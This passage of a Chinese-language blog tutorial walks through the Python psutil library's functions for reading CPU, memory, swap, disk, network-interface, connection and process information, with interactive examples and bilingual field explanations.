class="number">3.1</span>]</span><br><span class="line">[<span class="number">3.1</span>, <span class="number">0.0</span>, <span class="number">4.6</span>, <span class="number">1.6</span>, <span class="number">3.2</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.6</span>, <span class="number">7.8</span>, <span class="number">1.5</span>, <span class="number">3.2</span>, <span class="number">0.0</span>]</span><br><span class="line">[<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.6</span>, <span class="number">0.0</span>, <span class="number">1.6</span>, <span class="number">3.1</span>, <span class="number">1.6</span>, <span class="number">3.2</span>, <span class="number">3.2</span>, <span class="number">0.0</span>, <span class="number">4.8</span>, <span class="number">0.0</span>]</span><br><span class="line">[<span class="number">4.6</span>, <span class="number">0.0</span>, <span class="number">3.1</span>, <span class="number">1.6</span>, <span class="number">3.2</span>, <span class="number">0.0</span>, <span class="number">1.6</span>, <span class="number">1.6</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.6</span>]</span><br><span class="line">[<span class="number">4.6</span>, <span class="number">0.0</span>, <span class="number">9.4</span>, <span class="number">0.0</span>, <span class="number">3.2</span>, <span class="number">1.6</span>, <span class="number">1.6</span>, <span class="number">3.2</span>, <span class="number">1.6</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>]</span><br></pre></td></tr></table></figure><blockquote><p>实现类似<code>top</code>命令的CPU使用率，每秒刷新一次，累计10次</p></blockquote><h4 id="2-获取内存信息"><a href="#2-获取内存信息" class="headerlink" title="2.获取内存信息"></a>2.获取内存信息</h4><p><code># psutil.virtual_memory()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.virtual_memory()</span><br><span class="line">svmem(total=<span class="number">8465469440</span>, available=<span class="number">1928949760</span>, percent=<span class="number">77.2</span>, used=<span class="number">6536519680</span>, free=<span class="number">1928949760</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mem = psutil.virtual_memory()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mem.total</span><br><span class="line"><span class="number">8465469440</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mem.available</span><br><span class="line"><span class="number">1980764160</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mem.percent</span><br><span class="line"><span class="number">76.6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mem.used</span><br><span class="line"><span class="number">6484705280</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mem.free</span><br><span class="line"><span class="number">1980764160</span></span><br></pre></td></tr></table></figure><blockquote><p>以命名元组的形式返回有关系统内存使用情况的统计信息，包括以下字段：（以字节表示）</p><ul><li><strong>total</strong>: total physical memory (exclusive swap).物理内存的大小，其中包括扩展后的内存</li><li><strong>available</strong>: the memory that can be given instantly to processes without the system going into swap. This is calculated by summing different memory values depending on the platform and it is supposed to be used to monitor actual memory usage in a cross platform fashion.无需系统交换即可立即分配给进程的内存。这是通过根据平台对不同的内存值求和而得出的，并且应该以跨平台的方式监视实际的内存使用情况。</li></ul></blockquote><p><code># psutil.swap_memory()</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.swap_memory()</span><br><span class="line">sswap(total=<span class="number">13834178560</span>, used=<span class="number">12163084288</span>, free=<span class="number">1671094272</span>, percent=<span class="number">87.9</span>, sin=<span class="number">0</span>, sout=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><blockquote><p>以命名元组形式返回系统交换内存统计信息，包括以下字段：</p><ul><li><strong>total</strong>: total swap memory in bytes</li><li><strong>used</strong>: used swap memory in bytes</li><li><strong>free</strong>: free swap memory in bytes</li><li><strong>percent</strong>: the percentage usage calculated as <code>(total - available) / total * 100</code></li><li><strong>sin</strong>: the number of bytes the system has swapped in from disk (cumulative)</li><li><strong>sout</strong>: the number of bytes the system has swapped out from disk (cumulative)</li></ul></blockquote><h4 id="3-获取磁盘信息"><a href="#3-获取磁盘信息" class="headerlink" title="3.获取磁盘信息"></a>3.获取磁盘信息</h4><p><code># psutil.disk_partitions(all=False)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.disk_partitions()</span><br><span class="line">[sdiskpart(device=<span class="string">'C:\\'</span>, mountpoint=<span class="string">'C:\\'</span>, fstype=<span class="string">'NTFS'</span>, opts=<span class="string">'rw,fixed'</span>), sdiskpart(device=<span class="string">'D:\\'</span>, mountpoint=<span class="string">'D:\\'</span>, fstype=<span class="string">'NTFS'</span>, opts=<span class="string">'rw,fixed'</span>), sdiskpart(device=<span class="string">'E:\\'</span>, mountpoint=<span class="string">'E:\\'</span>, fstype=<span class="string">'NTFS'</span>, opts=<span class="string">'rw,fixed'</span>), sdiskpart(device=<span class="string">'F:\\'</span>, mountpoint=<span class="string">'F:\\'</span>, fstype=<span class="string">'NTFS'</span>, opts=<span class="string">'rw,fixed'</span>)]</span><br></pre></td></tr></table></figure><blockquote><p>将所有安装的磁盘分区作为命名元组的列表返回，包括设备，安装点和文件系统类型，类似于UNIX上的“ df”命令。如果参数 <code>all</code> 为False，它将尝试仅区分和返回物理设备（例如硬盘，cd-rom驱动器，USB密钥），而忽略所有其他设备（例如伪，内存，重复，不可访问的文件系统）。请注意，这可能并非在所有系统上都完全可靠（例如，在BSD上，此参数将被忽略）。</p><ul><li>元组的<code>fstype</code>字段是一个字符串，该字符串随平台而异。在Linux上，它可以是/ proc / filesystems中的值之一（例如，对于ext3硬盘驱动器为’ext3’，对于CD-ROM驱动器为’iso9660’）。</li><li>在Windows上，它是通过GetDriveType确定的，可以是“可<strong>removable</strong>”，“<strong>fixed</strong>”，“<strong>remote</strong>”，“ cdrom”，“<strong>unmounted</strong>”或“ ramdisk”。</li><li>文件格式是NTFS，<code>opts</code>中包含<code>rw</code>表示可读写，<code>journaled</code>表示支持日志。</li></ul></blockquote><p><code># psutil.disk_usage(path)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.disk_usage(<span class="string">'/'</span>)</span><br><span class="line">sdiskusage(total=<span class="number">126671122432</span>, used=<span class="number">73939677184</span>, free=<span class="number">52731445248</span>, percent=<span class="number">58.4</span>)</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，磁盘<code>&#39;/&#39;</code>的总容量是117= 120 GB，使用了58.4%。</p><p>返回有关分区的磁盘使用情况统计信息，该统计信息包含给定路径作为命名元组，包括以字节表示的总，已用和可用空间，以及百分比使用率。如果路径不存在，则会引发TypeError。</p></blockquote><h4 id="4-获取网络信息"><a href="#4-获取网络信息" class="headerlink" title="4.获取网络信息"></a>4.获取网络信息</h4><p><code># psutil.net_io_counters(pernic=False, nowrap=True)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.net_io_counters()</span><br><span class="line">snetio(bytes_sent=<span class="number">332005547</span>, bytes_recv=<span class="number">2514536823</span>, packets_sent=<span class="number">1837787</span>, packets_recv=<span class="number">3002849</span>, errin=<span class="number">0</span>, errout=<span class="number">0</span>, dropin=<span class="number">0</span>, dropout=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><blockquote><p>以命名元组的形式返回系统范围的网络I / O统计信息，其中包括以下属性：</p><ul><li><strong>bytes_sent</strong>: number of bytes sent。发送的字节数</li><li><strong>bytes_recv</strong>: number of bytes received。接收到的字节数</li><li><strong>packets_sent</strong>: number of packets sent。发送的包数</li><li><strong>packets_recv</strong>: number of packets received。接收到的包数</li><li><strong>errin</strong>: total number of errors while receiving。接收时的错误总数</li><li><strong>errout</strong>: total number of errors while sending。发送时的错误总数</li><li><strong>dropin</strong>: total number of incoming packets which were dropped。被丢弃的入站数据包总数</li><li><strong>dropout</strong>: total number of outgoing packets which were dropped (always 0 on macOS and BSD)。丢弃的传出数据包总数（在macOS和BSD上始终为0）</li></ul><p>如果<code>pernic</code>为<code>True</code>，则以字典的形式为系统上安装的每个网络接口返回相同的信息，字典以网络接口名称作为键，并将上述命名的元组作为值。在某些系统（例如Linux）上，或者在非常繁忙或长期使用的系统上，内核返回的数字可能会溢出并换行（从零开始）。如果nowrap为True，则psutil将在函数调用中检测并调整这些数字，并将“旧值”添加到“新值”，以便返回的数字将始终增加或保持不变，但绝不会减少。 net_io_counters.cache_clear（）可用于使<code>nowrap</code>缓存无效。在没有网络接口的计算机上，如果<code>pernic</code>为True，则此函数将返回<code>None</code>或<code>{}</code>。</p></blockquote><p><code># psutil.net_if_addrs()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.net_if_addrs()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'以太网'</span>: [snicaddr(family=&lt;AddressFamily.AF_LINK: <span class="number">-2</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="keyword">None</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>), snicaddr(family=&lt;AddressFamily.AF_INET: <span class="number">5</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="string">'……'</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>), snicaddr(family=&lt;AddressFamily.AF_INET6: <span class="number">21</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="keyword">None</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>)], </span><br><span class="line">    <span class="string">'Npcap Loopback Adapter'</span>: [snicaddr(family=&lt;AddressFamily.AF_LINK: <span class="number">-1</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="keyword">None</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>), snicaddr(family=&lt;AddressFamily.AF_INET: <span class="number">5</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="string">'……'</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>), snicaddr(family=&lt;AddressFamily.AF_INET6: <span class="number">4</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="keyword">None</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>)], </span><br><span class="line">    <span class="string">'本地连接* 2'</span>: [snicaddr(family=&lt;AddressFamily.AF_LINK: <span class="number">-1</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="keyword">None</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>), snicaddr(family=&lt;AddressFamily.AF_INET: <span class="number">5</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="string">'……'</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>), snicaddr(family=&lt;AddressFamily.AF_INET6: <span class="number">4</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="keyword">None</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>)], </span><br><span class="line">    </span><br><span class="line">    <span class="string">'Loopback Pseudo-Interface 1'</span>: [snicaddr(family=&lt;AddressFamily.AF_INET: <span class="number">5</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="string">'……'</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>), snicaddr(family=&lt;AddressFamily.AF_INET6: <span class="number">24</span>&gt;, address=<span class="string">'……'</span>, netmask=<span class="keyword">None</span>, broadcast=<span class="keyword">None</span>, ptp=<span class="keyword">None</span>)]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以字典的形式返回与系统上安装的每个NIC（网络接口卡）相关的地址，该字典的键是NIC名称，值是分配给NIC的每个地址的命名元组列表。每个命名元组包括5个字段：</p><ul><li><strong>family</strong>: the address family, either <a href="https://docs.python.org/3/library/socket.html#socket.AF_INET" target="_blank" rel="noopener">AF_INET</a> or <a href="https://docs.python.org/3/library/socket.html#socket.AF_INET6" target="_blank" rel="noopener">AF_INET6</a> or <a href="https://psutil.readthedocs.io/en/latest/#psutil.AF_LINK" target="_blank" rel="noopener"><code>psutil.AF_LINK</code></a>, which refers to a MAC address.地址族，即AF_INET或AF_INET6或psutil.AF_LINK，它是指MAC地址。</li><li><strong>address</strong>: the primary NIC address (always set).主NIC地址（始终设置）。</li><li><strong>netmask</strong>: the netmask address (may be <code>None</code>).网络掩码地址（可以为“无”）</li><li><strong>broadcast</strong>: the broadcast address (may be <code>None</code>).广播地址（可以为“无”）。</li><li><strong>ptp</strong>: stands for “point to point”; it’s the destination address on a point to point interface (typically a VPN). <em>broadcast</em> and <em>ptp</em> are mutually exclusive. May be <code>None</code>.代表“点对点”；它是点对点接口（通常是VPN）上的目标地址。广播和ptp是互斥的。可能为“无”。</li></ul></blockquote><p><code># psutil.net_connections(kind=&#39;inet&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> psutil</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.net_connections()</span><br><span class="line">[</span><br><span class="line">    sconn(fd=<span class="number">83</span>, family=&lt;AddressFamily.AF_INET6: <span class="number">30</span>&gt;, type=<span class="number">1</span>, laddr=addr(ip=<span class="string">'::127.0.0.1'</span>, port=<span class="number">62911</span>), raddr=addr(ip=<span class="string">'::127.0.0.1'</span>, port=<span class="number">3306</span>), status=<span class="string">'ESTABLISHED'</span>, pid=<span class="number">3725</span>),</span><br><span class="line">    sconn(fd=<span class="number">84</span>, family=&lt;AddressFamily.AF_INET6: <span class="number">30</span>&gt;, type=<span class="number">1</span>, laddr=addr(ip=<span class="string">'::127.0.0.1'</span>, port=<span class="number">62905</span>), raddr=addr(ip=<span class="string">'::127.0.0.1'</span>, port=<span class="number">3306</span>), status=<span class="string">'ESTABLISHED'</span>, pid=<span class="number">3725</span>),</span><br><span class="line">    sconn(fd=<span class="number">93</span>, family=&lt;AddressFamily.AF_INET6: <span class="number">30</span>&gt;, type=<span class="number">1</span>, laddr=addr(ip=<span class="string">'::'</span>, port=<span class="number">8080</span>), raddr=(), status=<span class="string">'LISTEN'</span>, pid=<span class="number">3725</span>),</span><br><span class="line">    sconn(fd=<span class="number">103</span>, family=&lt;AddressFamily.AF_INET6: <span class="number">30</span>&gt;, type=<span class="number">1</span>, laddr=addr(ip=<span class="string">'::127.0.0.1'</span>, port=<span class="number">62918</span>), raddr=addr(ip=<span class="string">'::127.0.0.1'</span>, port=<span class="number">3306</span>), status=<span class="string">'ESTABLISHED'</span>, pid=<span class="number">3725</span>),</span><br><span class="line">    sconn(fd=<span class="number">105</span>, family=&lt;AddressFamily.AF_INET6: <span class="number">30</span>&gt;, type=<span class="number">1</span>, ..., pid=<span class="number">3725</span>),</span><br><span class="line">    sconn(fd=<span class="number">106</span>, family=&lt;AddressFamily.AF_INET6: <span class="number">30</span>&gt;, type=<span class="number">1</span>, ..., pid=<span class="number">3725</span>),</span><br><span class="line">    sconn(fd=<span class="number">107</span>, family=&lt;AddressFamily.AF_INET6: <span class="number">30</span>&gt;, type=<span class="number">1</span>, ..., pid=<span class="number">3725</span>),</span><br><span class="line">    ...</span><br><span class="line">    sconn(fd=<span class="number">27</span>, family=&lt;AddressFamily.AF_INET: <span class="number">2</span>&gt;, type=<span class="number">2</span>, ..., pid=<span class="number">1</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><blockquote><p>以命名元组列表的形式返回系统范围的套接字连接。每个命名元组都提供7个属性：</p><ul><li><strong>fd</strong>: the socket file descriptor. If the connection refers to the current process this may be passed to <a href="https://docs.python.org/3/library/socket.html#socket.fromfd" target="_blank" rel="noopener">socket.fromfd</a> to obtain a usable socket object. On Windows and SunOS this is always set to <code>-1</code>.套接字文件描述符。如果连接引用当前进程，则可以将其传递给socket.fromfd以获得可用的套接字对象。在Windows和SunOS上，该值始终设置为-1。 </li><li><strong>family</strong>: the address family, either <a href="https://docs.python.org/3/library/socket.html#socket.AF_INET" target="_blank" rel="noopener">AF_INET</a>, <a href="https://docs.python.org/3/library/socket.html#socket.AF_INET6" target="_blank" rel="noopener">AF_INET6</a> or <a href="https://docs.python.org/3/library/socket.html#socket.AF_UNIX" target="_blank" rel="noopener">AF_UNIX</a>.地址家族，AF_INET，AF_INET6或AF_UNIX。</li><li><strong>type</strong>: the address type, either <a href="https://docs.python.org/3/library/socket.html#socket.SOCK_STREAM" target="_blank" rel="noopener">SOCK_STREAM</a>, <a href="https://docs.python.org/3/library/socket.html#socket.SOCK_DGRAM" target="_blank" rel="noopener">SOCK_DGRAM</a> or <a href="https://docs.python.org/3/library/socket.html#socket.SOCK_SEQPACKET" target="_blank" rel="noopener">SOCK_SEQPACKET</a>.地址类型，可以是SOCK_STREAM，SOCK_DGRAM或SOCK_SEQPACKET。地址类型，可以是SOCK_STREAM，SOCK_DGRAM或SOCK_SEQPACKET。</li><li><strong>laddr</strong>: the local address as a <code>(ip, port)</code> named tuple or a <code>path</code> in case of AF_UNIX sockets. For UNIX sockets see notes below.本地地址，作为（元组，端口）命名为tuple或在AF_UNIX套接字的情况下为路径。对于UNIX套接字，请参见下面的注释。</li><li><strong>raddr</strong>: the remote address as a <code>(ip, port)</code> named tuple or an absolute <code>path</code> in case of UNIX sockets. When the remote endpoint is not connected you’ll get an empty tuple (AF_INET<em>) or <code>&quot;&quot;</code> (AF_UNIX). For UNIX sockets see notes below.远程地址，表示为元组（ip，端口），如果是UNIX套接字，则为绝对路径。当远程端点未连接时，您将获得一个空的元组（AF_INET </em>）或“”（AF_UNIX）。对于UNIX套接字，请参见下面的注释。</li><li><strong>status</strong>: represents the status of a TCP connection. The return value is one of the <a href="https://psutil.readthedocs.io/en/latest/#connections-constants" target="_blank" rel="noopener">psutil.CONN_*</a> constants (a string). For UDP and UNIX sockets this is always going to be <a href="https://psutil.readthedocs.io/en/latest/#psutil.CONN_NONE" target="_blank" rel="noopener"><code>psutil.CONN_NONE</code></a>.表示TCP连接的状态。返回值是psutil.CONN_ *常量之一（字符串）。对于UDP和UNIX套接字，它将始终为psutil.CONN_NONE。</li><li><strong>pid</strong>: the PID of the process which opened the socket, if retrievable, else <code>None</code>. On some platforms (e.g. Linux) the availability of this field changes depending on process privileges (root is needed).打开套接字的进程的PID，如果可检索，否则为None。在某些平台（例如Linux）上，此字段的可用性会根据进程特权（需要root）而变化。</li></ul></blockquote><div class="table-container"><table><thead><tr><th><strong>Kind value</strong></th><th><strong>Connections using</strong></th></tr></thead><tbody><tr><td><code>&quot;inet&quot;</code></td><td>IPv4 and IPv6</td></tr><tr><td><code>&quot;inet4&quot;</code></td><td>IPv4</td></tr><tr><td><code>&quot;inet6&quot;</code></td><td>IPv6</td></tr><tr><td><code>&quot;tcp&quot;</code></td><td>TCP</td></tr><tr><td><code>&quot;tcp4&quot;</code></td><td>TCP over IPv4</td></tr><tr><td><code>&quot;tcp6&quot;</code></td><td>TCP over IPv6</td></tr><tr><td><code>&quot;udp&quot;</code></td><td>UDP</td></tr><tr><td><code>&quot;udp4&quot;</code></td><td>UDP over IPv4</td></tr><tr><td><code>&quot;udp6&quot;</code></td><td>UDP over IPv6</td></tr><tr><td><code>&quot;unix&quot;</code></td><td>UNIX socket (both UDP and TCP protocols)</td></tr><tr><td><code>&quot;all&quot;</code></td><td>the sum of all the possible families and protocols</td></tr></tbody></table></div><h4 id="5-获取进程信息"><a href="#5-获取进程信息" class="headerlink" title="5.获取进程信息"></a>5.获取进程信息</h4><p><code># psutil.pids()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.pids()</span><br><span class="line">[<span class="number">0</span>, <span class="number">4</span>, <span class="number">144</span>, <span class="number">168</span>, <span class="number">452</span>, <span class="number">496</span>, <span class="number">564</span>, <span class="number">636</span>, <span class="number">672</span>, <span class="number">708</span>, <span class="number">748</span>, <span class="number">844</span>, <span class="number">848</span>, <span class="number">920</span>, <span class="number">940</span>, <span class="number">1088</span>, <span class="number">1140</span>, <span class="number">1168</span>, <span class="number">1244</span>, <span class="number">1292</span>, <span class="number">1344</span>, <span class="number">1352</span>, <span class="number">1416</span>, <span class="number">1432</span>, <span class="number">1440</span>, <span class="number">1584</span>]</span><br></pre></td></tr></table></figure><blockquote><p>返回所有进程的PID</p></blockquote><p><code># psutil.process_iter(attrs=None, ad_value=None)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> pro <span class="keyword">in</span> psutil.process_iter([<span class="string">'name'</span>,<span class="string">'pid'</span>]):</span><br><span class="line"><span class="meta">... </span>    print(pro.info)</span><br><span class="line">...</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'System Idle Process'</span>, <span class="string">'pid'</span>: <span class="number">0</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'System'</span>, <span class="string">'pid'</span>: <span class="number">4</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'Registry'</span>, <span class="string">'pid'</span>: <span class="number">144</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'Typora.exe'</span>, <span class="string">'pid'</span>: <span class="number">168</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'RuntimeBroker.exe'</span>, <span class="string">'pid'</span>: <span class="number">452</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'smss.exe'</span>, <span class="string">'pid'</span>: <span class="number">496</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'svchost.exe'</span>, <span class="string">'pid'</span>: <span class="number">564</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'svchost.exe'</span>, <span class="string">'pid'</span>: <span class="number">636</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'svchost.exe'</span>, <span class="string">'pid'</span>: <span class="number">672</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'fontdrvhost.exe'</span>, <span class="string">'pid'</span>: <span class="number">708</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'csrss.exe'</span>, <span class="string">'pid'</span>: <span class="number">748</span>&#125;</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'svchost.exe'</span>, <span class="string">'pid'</span>: <span class="number">844</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>返回一个迭代器，为本地计算机上所有正在运行的进程生成一个Process类实例。与psutil.pids（）相比，此方法应优先于进程进行迭代，因为这样可以避免出现竞争情况。每个Process实例仅创建一次，然后在下次调用<code>psutil.process_iter()</code>时进行缓存（如果PID仍然有效）。此外，还可以确保过程PID不被重用。</p><p><code>attrs</code>和<code>ad_value</code>的含义与<code>Process.as_dict()</code>中的含义相同。有以下选项： </p></blockquote><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td><code>&#39;cmdline&#39;</code></td><td>进程启动的命令行</td></tr><tr><td><code>&#39;connections&#39;</code></td><td>进程相关网络连接</td></tr><tr><td><code>&#39;cpu_affinity&#39;</code></td><td></td></tr><tr><td><code>&#39;cpu_percent&#39;</code></td><td></td></tr><tr><td><code>&#39;cpu_num&#39;</code></td><td></td></tr><tr><td><code>&#39;cpu_times&#39;</code></td><td>进程使用的CPU时间</td></tr><tr><td><code>&#39;create_time&#39;</code></td><td>进程创建时间</td></tr><tr><td><code>&#39;cwd&#39;</code></td><td>进程工作目录</td></tr><tr><td><code>&#39;environ&#39;</code></td><td>进程环境变量</td></tr><tr><td><code>&#39;exe&#39;</code></td><td>进程exe路径</td></tr><tr><td><code>&#39;gids&#39;</code></td><td></td></tr><tr><td><code>&#39;io_counters&#39;</code></td><td></td></tr><tr><td><code>&#39;ionice&#39;</code></td><td></td></tr><tr><td><code>&#39;memory_full_info&#39;</code></td><td></td></tr><tr><td><code>&#39;memory_info&#39;</code></td><td></td></tr><tr><td><code>&#39;memory_maps&#39;</code></td><td></td></tr><tr><td><code>&#39;memory_percent&#39;</code></td><td></td></tr><tr><td><code>&#39;name&#39;</code></td><td>进程名称</td></tr><tr><td><code>&#39;nice&#39;</code></td><td></td></tr><tr><td><code>&#39;num_ctx_switches&#39;</code></td><td></td></tr><tr><td><code>&#39;num_fds&#39;</code></td><td></td></tr><tr><td><code>&#39;num_handles&#39;</code></td><td></td></tr><tr><td><code>&#39;num_threads&#39;</code></td><td>进程的线程数量</td></tr><tr><td><code>&#39;open_files&#39;</code></td><td>进程打开的文件</td></tr><tr><td><code>&#39;pid&#39;</code></td><td>进程的ID</td></tr><tr><td><code>&#39;ppid&#39;</code></td><td>父进程ID</td></tr><tr><td><code>&#39;status&#39;</code></td><td>进程状态</td></tr><tr><td><code>&#39;terminal&#39;</code></td><td>进程终端</td></tr><tr><td><code>&#39;threads&#39;</code>,</td><td>所有线程信息</td></tr><tr><td><code>&#39;uids&#39;</code></td><td></td></tr><tr><td><code>&#39;username&#39;</code></td><td>进程用户名</td></tr></tbody></table></div><blockquote><p>如果指定了<code>attrs</code>，则<code>Process.as_dict()</code>的结果将作为附加到返回的Process实例的info属性存储。如果attrs是一个空列表，它将检索所有过程信息（缓慢）。与之对应的功能还有下面的函数</p></blockquote><p><code>#  psutil.Process(3776)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.pids() <span class="comment"># 所有进程ID</span></span><br><span class="line">[<span class="number">3865</span>, <span class="number">3864</span>, <span class="number">3863</span>, <span class="number">3856</span>, <span class="number">3855</span>, <span class="number">3853</span>, <span class="number">3776</span>, ..., <span class="number">45</span>, <span class="number">44</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = psutil.Process(<span class="number">3776</span>) <span class="comment"># 获取指定进程ID=3776，其实就是当前Python交互环境</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.name() <span class="comment"># 进程名称</span></span><br><span class="line"><span class="string">'python3.6'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.exe() <span class="comment"># 进程exe路径</span></span><br><span class="line"><span class="string">'/Users/michael/anaconda3/bin/python3.6'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.cwd() <span class="comment"># 进程工作目录</span></span><br><span class="line"><span class="string">'/Users/michael'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.cmdline() <span class="comment"># 进程启动的命令行</span></span><br><span class="line">[<span class="string">'python3'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.ppid() <span class="comment"># 父进程ID</span></span><br><span class="line"><span class="number">3765</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.parent() <span class="comment"># 父进程</span></span><br><span class="line">&lt;psutil.Process(pid=<span class="number">3765</span>, name=<span class="string">'bash'</span>) at <span class="number">4503144040</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.children() <span class="comment"># 子进程列表</span></span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status() <span class="comment"># 进程状态</span></span><br><span class="line"><span 